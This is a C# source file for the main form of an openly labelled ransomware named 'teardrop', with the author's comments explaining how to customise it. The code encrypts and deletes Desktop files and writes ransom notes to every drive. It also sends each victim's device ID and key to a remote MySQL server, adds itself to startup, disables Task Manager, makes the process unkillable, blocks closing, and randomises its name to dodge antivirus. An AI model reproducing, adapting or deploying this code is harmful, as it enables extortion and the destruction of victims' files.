﻿using DeviceId;
using Microsoft.Win32;
using MySql.Data.MySqlClient;
using System;
using System.Collections.Generic;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace teardrop
{
    public partial class FrmMain : Form
    {
        bool debug = Properties.Settings.Default.debug;

        private const string FILES_WILD_CARD = "*.*";

        private readonly string[] validExtensions = new[]
{
            ".jpg", ".jpeg", ".gif", ".mp3", ".m4a", ".wav", ".pdf", ".raw", ".bat", ".json", ".doc", ".txt", ".png", ".cs", ".c", 
            ".java", ".h", ".rar", ".zip", ".7zip", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".csv", ".sql", 
            ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".xhtml", ".odt", ".ods", ".wma", ".wav", ".mpa", 
            ".ogg", ".arj", ".deb", ".pkg", ".rar", ".tar.gz", ".gz", ".zip", ".py", ".pl", ".bin", ".ai" ,".ico", ".asp", 
            ".aspx", ".css", ".js", ".py", ".sh", ".vb", "java", ".cpp"
        };

        // So this is where a lot of magic is happening, and you dont wanna touch it unless spending 
        // a lot of time in getting it to work again. Since it "kinda works" (like 80%), im not gonna
        // try to fix this as long as a handful of people request it. It was already a pain and im happy
        // it works for now.
        string[] files;

        public FrmMain()
        {
            InitializeComponent();
        }

        // This method is used to create a log file. This is mainly used for debugging when changing 
        // the ransomware itself or adding new features on your own. I at least used it for crash reports.
        public void Log(string text, string title)
        {
            try
            {
                if (File.Exists(Application.StartupPath + "\\log.txt"))
                {
                    string prefix = "[" + DateTime.Now + "] ";
                    File.AppendAllText(Application.StartupPath + "\\log.txt", prefix + text + Environment.NewLine);
                }
            } catch { }
        }

        // So this is pretty straight forward. This code tries to register the ransomware into the registry startup.
        // in order to enable this feature you need to go into the "Form1_Load()" method and add "RegisterStartup(true);". Theoretically.
        private void RegisterStartup(bool isChecked)
        {
            try
            {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

                if (isChecked)
                {
                    registryKey.SetValue(Properties.Settings.Default.application_name, Application.ExecutablePath);
                }
                else
                {
                    registryKey.DeleteValue(Properties.Settings.Default.application_name);
                }
            }
            catch(Exception ex)
            {
                Log(ex.Message, "RegisterStartUp");
            }
        }

        // This method is used to check the basic needs for the ransomware, like if the encryption key was ever set,
        // or its lenght is the correct size etc..
        private void Setup()
        {
            GenerateKeys();
            GenerateRandomApplicationName();
            ChangeProcessMode();
            ChangeTaskManagerAccess();
            ChangeDesktopScreem();
        }

        private void ChangeDesktopScreem()
        {
            // Check what kind of theme is selected. You can find more information about this in Github Wiki
            if (Properties.Settings.Default.theme == "default")
            {
                panel_theme_flash.Visible = false;
                panel_theme_flash.Enabled = false;
            }
            else if (Properties.Settings.Default.theme == "flash")
            {
                // Set Window to be Fullscreen and overlap
                this.WindowState = FormWindowState.Maximized;
                this.FormBorderStyle = FormBorderStyle.None;

                // Enable the Panel Control and make it fill the Screen
                panel_theme_flash.Visible = true;
                panel_theme_flash.Enabled = true;
                panel_theme_flash.Dock = DockStyle.Fill;

                // Position the Label and set its Text
                label_theme_flash.Text = "HACKED";
                label_theme_flash.Font = new Font(label_theme_flash.Font.FontFamily, this.Height / 16, label_theme_flash.Font.Style);
                label_theme_flash.Location = new Point((panel_theme_flash.Width / 2) - (label_theme_flash.Width / 2), (panel_theme_flash.Height / 2) - (label_theme_flash.Height / 2));

                // Setting up the Timer and the method
                timer_theme_lash.Enabled = true;
                timer_theme_lash.Interval = 1000;
                timer_theme_lash.Tick += new EventHandler(timer_theme_flash_tick);
            }
        }

        private void ChangeTaskManagerAccess()
        {
            // If disable_taskmgr is true, disable task manager. else, enable.
            if (Properties.Settings.Default.disable_taskmgr == true)
            {
                try
                {
                    DisableTaskManager();
                }
                catch (Exception ex)
                {
                    Log(ex.Message, "Form1_Load > DisableTaskManager");
                }
            }
            else
            {
                try
                {
                    EnableTaskManager();
                }
                catch (Exception ex)
                {
                    Log(ex.Message, "Form1_Load > EnableTaskManager");
                }
            }
        }

        private void GenerateKeys()
        {
            // Check if Encryption/Decryption Key was ever created on that machine
            if (Properties.Settings.Default.key.Length != 34)
            {
                Properties.Settings.Default.key = Crypto.GetRandomString(34);
                Properties.Settings.Default.Save();
                Properties.Settings.Default.Reload();

                if (debug == true)
                {
                    write($@"Generated key: {Properties.Settings.Default.key}");
                }
            }
            else
            {
                if (debug == true)
                {
                    write($@"Key is: {Properties.Settings.Default.key}");
                }
            }
        }

        private void GenerateRandomApplicationName()
        {
            // Check if Application name is already set. If not, generate one
            // This should be random to try to be undetected from Anti-Virus
            if (Properties.Settings.Default.application_name.Length != 12)
            {
                Properties.Settings.Default.application_name = Crypto.GetRandomString(12);
                Properties.Settings.Default.Save();
                Properties.Settings.Default.Reload();

                if (debug == true)
                {
                    if (debug == true)
                    {
                        write($@"Generated Application Name: {Properties.Settings.Default.application_name}");
                    }

                    Log($@"Generated Application Name: {Properties.Settings.Default.application_name}", "Form1_Load > Generate Application Name");
                }
            }
            else
            {
                if (debug == true)
                {
                    write($@"Key is: {Properties.Settings.Default.key}");
                }
            }
        }

        private void ChangeProcessMode()
        {
            // Make the process unkillable. It process is terminated,
            // A bluescreen will appear.
            if (Properties.Settings.Default.unkillable == true)
            {
                ManageProcess.ProcessUnkillable();
            }
            else if (Properties.Settings.Default.unkillable == false)
            {
                ManageProcess.ProcessKillable();
            }
            else
            {
                Log("Unable to detect setting for making application unkillable", "Form1_Load > Unkillable");
            }
        }

        // This is used for the theme feature were there is once theme that flashes color.
        // This is responsible for the flashing part. You can change 'backcolor' and 'forecolor'
        // to something to your likings.
        private void timer_theme_flash_tick(object sender, EventArgs e)
        {
            // Switches the Color of the Panel and Label

            Color backcolor = Color.Red;            // Background Color
            Color forecolor = Color.Black;          // Font Color

            if(panel_theme_flash.BackColor == backcolor)
            {
                panel_theme_flash.BackColor = forecolor;
                label_theme_flash.ForeColor = backcolor;
            }
            else
            {
                panel_theme_flash.BackColor = backcolor;
                label_theme_flash.ForeColor = forecolor;
            }
        }

        // This is the entry point for the whole ransomware. Everything you put there 
        // will be executed first. Well at list this is where the program pointer will be set to.
        private void Form1_Load(object sender, EventArgs e)
        {
            string deviceId = string.Empty;

            // Simple "Styling"
            ShowInTaskbar = false;
            Text = "";
            ShowIcon = false;
            // Will make the ransomware overlay other applications
            //this.TopMost = true;    

            // Check if generated Strings are set like Application Name, Encryption Key, etc... are set
            Setup();

            // Register application to startup.
            RegisterStartup(true);

            timer1.Enabled = true;
            timer1.Start();

            ChangePanelSettings();

            deviceId = GetDeviceInfo();

            // the following code will register the victims machine on the mysql database server. 
            // this includes the generated deviceId and the encryption key.
            if (Properties.Settings.Default.db_enable == true)
            {
                // Connection String for MySQL Connection, if enabled.
                string myConnectionString = GetConnectionString();

                try
                {
                    MySqlConnection connection = new MySqlConnection(myConnectionString);
                    MySqlCommand command = connection.CreateCommand();
                    
                    command.CommandText = $@"INSERT INTO machine (deviceID,pass) VALUES ('{deviceId}', '{Properties.Settings.Default.key}')";
                    connection.Open();
                    
                    IDataReader Reader = command.ExecuteReader();

                    while (Reader.Read())
                    {
                        string row = "";
                        for (int i = 0; i < Reader.FieldCount; i++)
                            row += Reader.GetValue(i).ToString() + ", ";
                        Console.WriteLine(row);
                    }
                    connection.Close();
                }
                catch (Exception ex)
                {
                    if (ex.Message.Contains("DUPLICATE"))
                    {

                    }
                    else
                    {
                        Log(ex.Message, "Form1_Load > MySQL");
                    }
                }
            }

            // This will try to get as many files as possible.
            // Its not perferct and might fail sometimes on some drives etc..
            Task.Run(() => ChangeFiles());
        }

        private static string GetConnectionString()
        {
            return $@"SERVER={Properties.Settings.Default.db_host};
                      DATABASE={Properties.Settings.Default.db_database};
                      UID={Properties.Settings.Default.db_user}; 
                      PASSWORD={Properties.Settings.Default.db_pass};";
        }

        private string GetDeviceInfo()
        {
            try
            {
                // Generate Device ID for Database to identify encrypted machines
                return new DeviceIdBuilder()
                    .AddMachineName()
                    .AddProcessorId()
                    .AddMotherboardSerialNumber()
                    .AddSystemDriveSerialNumber()
                    .ToString();
            }
            catch (Exception DeviceIdError)
            {
                Log(DeviceIdError.Message, "Form1_Load > DeviceId");
                throw;
            }
        }

        private void ChangePanelSettings()
        {
            label1.Text = Properties.Settings.Default.application_title;
            // Center Visuals
            label1.Location = new Point(panel_main.Width / 2 - label1.Width / 2, label1.Location.Y);
            panel_main.Location = new Point(this.Width / 2 - panel_main.Width / 2, this.Height / 2 - panel_main.Height / 2);
        }

        // Pretty obvious that this will disable the taskmanager if possible.
        public void DisableTaskManager()
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (objRegistryKey.GetValue("DisableTaskMgr") == null)
            {
                objRegistryKey.SetValue("DisableTaskMgr", "1");
            }
            objRegistryKey.Close();
        }

        // This will re-enable the taskmanager again
        public void EnableTaskManager()
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (objRegistryKey.GetValue("DisableTaskMgr") != null)
            {
                objRegistryKey.DeleteValue("DisableTaskMgr");
            }
            objRegistryKey.Close();
        }

        // This is the method used to write text into the textbox. For my solution it is 
        // required to use this function so we can access the textbox control
        // from another thread without getting any error.
        public void write(string text)
        {
            if (textBox1.InvokeRequired)
            {
                textBox1.Invoke(new Action<string>(write), new object[] { text });
                return;
            }
            textBox1.AppendText(text + Environment.NewLine);
        }

        private void ShowAllFoldersUnder(string path, int indent, string mode = "decrypt")
        {
            // "skipPath" is experimental and currently working
            string[] skipPaths = new[]
            {
              "System32", "WinSxS", "Program Files"
            };

            try
            {
                if ((File.GetAttributes(path) & FileAttributes.ReparsePoint) != FileAttributes.ReparsePoint)
                {
                    IEnumerable<string> validDirectories = Directory.GetDirectories(path).Where(dir => !skipPaths.Contains(dir));

                    foreach (string folder in validDirectories)
                    {
                        if (!folder.Contains("System Volume Information"))
                        {
                            try
                            {
                                files = Directory.GetFiles(Path.GetFullPath(folder));
                            }
                            catch (Exception ex)
                            {
                                write(ex.Message);
                            }

                            // This should check the file extension.
                            foreach (string filePath in files)
                            {
                                string extension = Path.GetExtension(filePath);

                                // if the file has one of the extensions in validExtensions, it will try to encrypt it.
                                if (validExtensions.Contains(extension.ToLower())) // ToLower() is used because a txt file can have the extension txt, TXT, tXT and it would still work.
                                {
                                    // This now acts like a fuse so you dont accidentaly encrypt your own hard drive while testing. Uncomment line below to encrypt files
                                    //if(mode == "encrypt")
                                    //{
                                    //    Task.Run(() => Crypto.FileEncrypt(s, Properties.Settings.Default.key));
                                    //    write("Encrypted " + s);
                                    //}
                                    //else if(mode == "decrypt")
                                    //{
                                    //    Task.Run(() => Crypto.FileDecrypt(s, s.Replace(Properties.Settings.Default.extension, ""), Properties.Settings.Default.key));
                                    //    write("Decrypted " + s);
                                    //}

                                    try
                                    {
                                        // after encryptions we want to delete the original file. Wouldnt make sence if we keep it.
                                        //File.Delete(s);
                                    }
                                    catch (Exception ex2)
                                    {
                                        write($"Cant delete file {ex2.Message}");
                                        Log(ex2.Message, "ShowAllFoldersUnder > Delete Error");
                                    }
                                }
                            }
                        }
                        ShowAllFoldersUnder(folder, indent + 2);
                    }
                }
            }
            catch (Exception e)
            {
                write(e.Message); Log(e.Message, "ShowAllFolderUnder > General Error");
            }
        }

        // This will get all the files  and and tries to encrypt it. It works together with "ShowAllFoldersUnder()"
        // to get as many files as possible.
        public void ChangeFiles(string mode = "encrypt")
        {
            try
            {
                ManageFiles(mode);
                WriteMessagesOnDrivers();
            }
            catch (Exception ex)
            {
                Log(ex.Message, "GetFiles > General Drive Error");
            }

            write("Done getting stuff :)");
        }

        private void WriteMessagesOnDrivers()
        {
            // Now Encrypt whole hard drive
            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                // This will try to create message in eighter plain text file or html file.
                try
                {
                    if (Properties.Settings.Default.message.Length > 0)
                    {
                        File.WriteAllText($@"{drive.Name}\message.html", Properties.Settings.Default.message);
                        File.WriteAllText($@"{Environment.GetFolderPath(Environment.SpecialFolder.Desktop)}\message.html", Properties.Settings.Default.message);

                        write($@"Created File message.html on drive {drive.Name}\message");

                        Log($@"File 'message.html' created on drive{drive.Name}\message.html", "GetFiles > Check Message Settings");
                    }
                }
                catch (Exception ex)
                {
                    Log(ex.Message, "GetFiles > Create Message File");
                    write(ex.Message);
                }

                try
                {
                    write($@"Found drive {drive.Name}");
                    Log($@"Found drive {drive.Name}", "GetFiles > Drive State Check");

                    try
                    {
                        //  if the drive is ready try to get all the files and files in subfolders using ShowAllFoldersUnder()
                        if (drive.IsReady)
                        {
                            // Get all sub folders etc
                            ShowAllFoldersUnder(drive.Name, 0);
                        }
                        else
                        {
                            Log($@"Found drive {drive.Name} , but it's not ready.", "GetFiles > Drive State Check");
                            write($@"Found drive {drive.Name}, but it's not ready.");
                        }
                    }
                    catch { }
                }
                catch (Exception ex1)
                {
                    write($@"ex1 {ex1.Message}");
                    Log(ex1.Message, "GetFiles > Drive Error");
                }
            }
        }

        private void ManageFiles(string mode)
        {
            // Encrypt Desktop Files first!
            string deskTopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            string[] desktopFiles = Directory.GetFiles(deskTopPath, FILES_WILD_CARD, SearchOption.AllDirectories);
            foreach (string filePath in desktopFiles)
            {
                try
                {
                    if (!filePath.Contains(Properties.Settings.Default.extension) && !filePath.Contains("Sytem Volume Information") && mode != "decrypt")
                    {
                        Task.Run(() =>
                        {
                            string newFilePathWithExtension = string.Concat(filePath, '.', Properties.Settings.Default.extension);

                            Crypto.EncodeFile(filePath, newFilePathWithExtension, Properties.Settings.Default.key);
                        });

                        write($"Encrypted {filePath}");

                        try
                        {
                            File.Delete(filePath);
                        }
                        catch (Exception ex2)
                        {
                            write($"Cant delete file {ex2.Message}");
                            Log(ex2.Message, "GetFiles > File Delete Error");
                        }
                    }
                    else if (mode == "decrypt")
                    {
                        if (filePath.Contains(Properties.Settings.Default.extension) && !filePath.Contains("System Volume Information"))
                        {
                            Task.Run(() =>
                            {
                                string newFilePathWithoutExtension = filePath.Replace(Properties.Settings.Default.extension, string.Empty);

                                Crypto.DecodeFile(filePath, newFilePathWithoutExtension, Properties.Settings.Default.key);
                            });

                            write($"Decrypted {filePath}");

                            try
                            {
                                File.Delete(filePath);
                            }
                            catch (Exception ex2)
                            {
                                write($"Cant delete file {ex2.Message}");
                                Log(ex2.Message, "GetFiles > File Delete Error");
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Log(ex.Message, "Getfiles > General Error");
                }
            }
        }

        // used for the mouse click simulation. This is important and should not be touched.
        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint cButtons, uint dwExtraInfo);
        private const int MOUSEEVENTF_LEFTDOWN = 0x02;
        private const int MOUSEEVENTF_LEFTUP = 0x04;
        private const int MOUSEEVENTF_RIGHTDOWN = 0x08;
        private const int MOUSEEVENTF_RIGHTUP = 0x10;

        public void DoMouseClick()  // makes the mouse click.
        {
            // x and y are the locations where the mouse click will be performed. in this case, in the middle of the screen.
            uint X = (uint)Screen.PrimaryScreen.WorkingArea.Width / 2;
            uint Y = (uint)Screen.PrimaryScreen.WorkingArea.Height / 2;
            mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, X, Y, 0, 0);
        }

        // This is the code used to move the mouse to a certain position and perform a mouse click
        // On default, the mouse position will be set to the center of the screen
        private void timer1_Tick(object sender, EventArgs e)
        {
            Point screenPos = System.Windows.Forms.Cursor.Position;
            Point leftTop = new System.Drawing.Point(Screen.PrimaryScreen.WorkingArea.Width / 2, Screen.PrimaryScreen.WorkingArea.Height / 2);
            Cursor.Position = leftTop;

            // If mouse click is enabled (set to "true" in Project Settings) , the mouse will be clicked each intervall. 
            // This might be a work around for diabling ALT + Tab etc...
            if (Properties.Settings.Default.clickMouse == true)
            {
                DoMouseClick();
            }
        }

        // This should prevent the application from closing. Just a simple measurement but not 100% safe to use only.
        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        // Here we try to decrypt the files
        private void Button1_Click(object sender, EventArgs e)
        {
            // Small check if a key is actually set
            if(!string.IsNullOrEmpty(textBoxKey.Text.Trim()))
            {
                ChangeFiles("decrypt");
            }
        }
    }
}
